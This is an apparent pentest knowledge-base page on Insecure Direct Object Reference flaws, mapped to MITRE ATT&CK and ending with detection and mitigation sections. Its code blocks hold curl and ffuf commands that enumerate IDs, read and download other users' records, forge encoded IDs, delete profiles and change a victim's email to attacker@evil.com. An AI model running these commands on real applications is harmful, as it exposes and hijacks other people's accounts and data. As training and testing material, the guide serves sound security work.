% Filename: 04-web-testing/auth-session/idor.md
% Display name: Insecure Direct Object Reference (IDOR)
% Last update: 2026-02-11
% ATT&CK Tactics: TA0001 (Initial Access)
% ATT&CK Techniques: T1190 (Exploit Public-Facing Application)
% Authors: @TristanInSec

# Insecure Direct Object Reference (IDOR)

## Overview

Insecure Direct Object References (IDOR) occur when an application uses user-supplied input to directly access objects (database records, files, resources) without verifying that the user is authorized to access the requested object. The attacker simply changes an identifier — an ID in the URL, a parameter in a form, or a value in an API request — to access another user's data.

IDOR is the web-specific manifestation of broken access control. It is consistently one of the most common and high-impact findings in penetration tests. IDOR is now classified under OWASP API1 (Broken Object-Level Authorization / BOLA) in the API Security Top 10.

## ATT&CK Mapping

- **Tactic:** TA0001 - Initial Access
- **Technique:** T1190 - Exploit Public-Facing Application

## Prerequisites

- Application uses direct object references in requests (IDs, filenames, keys)
- Authenticated access to the application (at least one valid account)
- Ability to observe and modify request parameters (browser dev tools, proxy)

## Detection Methodology

### Identifying IDOR Candidates

Any parameter that references a specific object is a potential IDOR:

```bash
# URL path parameters
/api/users/42/profile
/api/orders/1337
/invoices/INV-2024-0042

# Query parameters
/download?file_id=42
/report?user_id=42
/api/messages?conversation_id=100

# POST/PUT body parameters
{"user_id": 42, "action": "delete"}
{"order_id": "ORD-1337", "status": "cancelled"}

# Headers and cookies
Cookie: user_id=42
X-User-ID: 42
```

### Boundary Testing

```bash
# curl
# https://curl.se/
# Access your own resource
curl -s -H "Authorization: Bearer YOUR_TOKEN" http://target.com/api/users/42

# Access another user's resource (increment/decrement the ID)
curl -s -H "Authorization: Bearer YOUR_TOKEN" http://target.com/api/users/41
curl -s -H "Authorization: Bearer YOUR_TOKEN" http://target.com/api/users/43
curl -s -H "Authorization: Bearer YOUR_TOKEN" http://target.com/api/users/1
```

If you receive data belonging to another user, IDOR is confirmed.

## Techniques

### Horizontal Privilege Escalation

Accessing another user's resources at the same privilege level:

```bash
# curl
# https://curl.se/
# View another user's profile
curl -s -H "Authorization: Bearer USER42_TOKEN" http://target.com/api/users/43/profile

# View another user's orders
curl -s -H "Authorization: Bearer USER42_TOKEN" http://target.com/api/users/43/orders

# Download another user's files
curl -s -H "Authorization: Bearer USER42_TOKEN" http://target.com/api/files/download?owner=43&file=report.pdf

# Modify another user's data
curl -s -X PUT -H "Authorization: Bearer USER42_TOKEN" \
  -H "Content-Type: application/json" \
  http://target.com/api/users/43/profile \
  -d '{"email":"attacker@evil.com"}'
```

### Vertical Privilege Escalation

Accessing admin or higher-privilege resources:

```bash
# curl
# https://curl.se/
# Access admin user's data (admin is often user ID 1)
curl -s -H "Authorization: Bearer REGULAR_USER_TOKEN" http://target.com/api/users/1/profile

# Access admin-only resources by changing role-related parameters
curl -s -X POST http://target.com/api/settings \
  -H "Authorization: Bearer REGULAR_USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"user_id":1,"setting":"allow_signups","value":false}'
```

### ID Enumeration

```bash
# ffuf
# https://github.com/ffuf/ffuf
# Enumerate numeric IDs
ffuf -u http://target.com/api/users/FUZZ/profile \
  -w <(seq 1 1000) \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -mc 200 -fc 403,404

# Enumerate formatted IDs
ffuf -u http://target.com/api/invoices/INV-2024-FUZZ \
  -w <(seq -w 0001 9999) \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -mc 200 -fc 403,404
```

### Non-Numeric ID Manipulation

**UUIDs:**

UUIDs are harder to enumerate but not immune:

```bash
# curl
# https://curl.se/
# UUIDs may be leaked in other responses (user lists, search results, API responses)
# Check if the application exposes UUIDs anywhere:
curl -s -H "Authorization: Bearer YOUR_TOKEN" http://target.com/api/users | python3 -m json.tool
# Look for "id":"a1b2c3d4-e5f6-7890-abcd-ef1234567890" in the response

# Some UUID implementations are sequential (UUID v1 contains timestamps)
# If you observe patterns, predict adjacent UUIDs
```

**Hashed or encoded IDs:**

```bash
# Base64-encoded IDs
echo "user_42" | base64
# Output: dXNlcl80Mg==
# Try: echo "user_43" | base64 → dXNlcl80Mw==

# MD5-hashed IDs
echo -n "42" | md5sum
# Try other IDs and compare hashes against observed values

# If the application uses base64(JSON), decode and modify:
echo "eyJ1c2VyX2lkIjo0Mn0=" | base64 -d
# Output: {"user_id":42}
# Modify to {"user_id":43} and re-encode
echo -n '{"user_id":43}' | base64
```

### IDOR in Different Request Contexts

**File download:**

```bash
# curl
# https://curl.se/
curl -s -H "Authorization: Bearer YOUR_TOKEN" \
  "http://target.com/download?file=user42_report.pdf" -o report.pdf

# Try other users' files
curl -s -H "Authorization: Bearer YOUR_TOKEN" \
  "http://target.com/download?file=user43_report.pdf" -o stolen.pdf
```

**Bulk operations:**

```bash
# curl
# https://curl.se/
# If an API accepts arrays of IDs
curl -s -X POST http://target.com/api/export \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"user_ids":[42,43,44,45,1]}'
```

**Indirect references:**

```bash
# curl
# https://curl.se/
# IDOR through related objects
# Your order references your address — change the address ID
curl -s -X PUT http://target.com/api/orders/100 \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"shipping_address_id":999}'
# Address 999 may belong to another user, leaking their address
```

### HTTP Method Switching

```bash
# curl
# https://curl.se/
# GET may be protected but DELETE may not check authorization
curl -s -X DELETE -H "Authorization: Bearer YOUR_TOKEN" \
  http://target.com/api/users/43/profile

# PUT/PATCH may lack authorization checks that GET enforces
curl -s -X PATCH -H "Authorization: Bearer YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  http://target.com/api/users/43 \
  -d '{"email":"attacker@evil.com"}'
```

## Detection Methods

### Network-Based Detection

- Sequential access to incrementing/decrementing object IDs from the same session
- Access to objects belonging to users other than the authenticated user
- High-volume requests testing many ID values (enumeration)
- Successful responses to requests with object IDs not associated with the session

### Host-Based Detection

- Application logs showing authorized user accessing other users' objects
- Data access patterns where a single session accesses many different user records
- Modification operations on objects owned by different users than the session owner

## Mitigation Strategies

- **Server-side authorization on every request** — check that the authenticated user owns or has permission to access the requested object. Never rely on the client not changing IDs
- **Indirect object references** — map user-facing references to internal IDs server-side. Instead of `/api/orders/42`, use `/api/orders/my-latest` and resolve ownership on the server
- **Use unpredictable identifiers** — UUIDs (v4) are not a security control but raise the bar against enumeration. Always combine with authorization checks
- **Consistent access control layer** — implement authorization as middleware or a centralized policy, not ad-hoc checks in each endpoint
- **Log and monitor** — log all access to sensitive objects with the authenticated user's identity. Alert on patterns of cross-user access

## References

### Pentest Guides & Research

- [PortSwigger Web Security Academy - Access Control](https://portswigger.net/web-security/access-control)
- [OWASP - Testing for IDOR](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)

### MITRE ATT&CK

- [T1190 - Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
